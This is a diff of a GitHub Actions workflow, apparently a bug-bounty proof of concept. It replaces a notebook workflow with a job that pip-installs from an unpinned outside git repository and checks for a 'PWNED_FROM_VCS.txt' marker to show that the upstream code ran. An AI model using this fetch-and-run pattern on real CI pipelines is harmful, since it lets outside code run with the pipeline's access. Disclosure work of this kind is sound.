@@ -1,30 +1,30 @@
-name: Notebooks
+name: VRP PoC - Unpinned VCS RCE
 
 on:
-  pull_request:
-    paths:
-      - "**.ipynb"
   workflow_dispatch:
 
 jobs:
-  poc-vcs-install:
-    if: github.event_name == 'workflow_dispatch'
-    name: PoC – VCS install (unpinned)
+  poc-vcs-rce:
+    name: 🔓 PoC: Unpinned VCS executes upstream code
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - uses: actions/setup-python@v6
         with:
           python-version: '3.11'
-      - name: Install (unpinned) from VCS
+      - name: 📦 Install from unpinned VCS (vulnerable)
         run: |
+          echo "Installing from unpinned git+https:// URL..."
           python3 -m pip install -U "git+https://github.com/reconsumeralization/tfdocs-poc-20250922181610"
-      - name: Verify PoC marker
+      - name: 🎯 Verify PoC execution marker
         run: |
+          echo "Checking for execution marker..."
           ls -la
           if test -f PWNED_FROM_VCS.txt; then
-            echo "[POC] Marker present:"
+            echo "✅ [POC SUCCESS] Upstream code executed!"
+            echo "📄 Marker contents:"
             cat PWNED_FROM_VCS.txt
           else
-            echo "[POC] Marker missing"; exit 1
+            echo "❌ [POC FAILED] No marker found"
+            exit 1
           fi
